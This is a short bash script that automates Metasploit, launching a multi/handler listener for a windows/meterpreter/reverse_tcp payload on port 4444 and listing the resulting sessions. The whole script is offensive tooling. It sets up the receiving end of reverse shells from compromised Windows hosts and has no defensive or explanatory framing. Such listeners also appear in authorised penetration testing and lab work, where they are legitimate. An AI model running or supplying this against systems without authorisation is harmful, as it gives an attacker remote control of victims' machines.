#!/bin/bash

# Script to automate Metasploit commands for exploitation

# Ensure the script is run as root
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root."
  exit
fi

# Start Metasploit Framework
msfconsole -q -x "
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $(hostname -I | awk '{print $1}')
set LPORT 4444
exploit -j -z
sessions
"
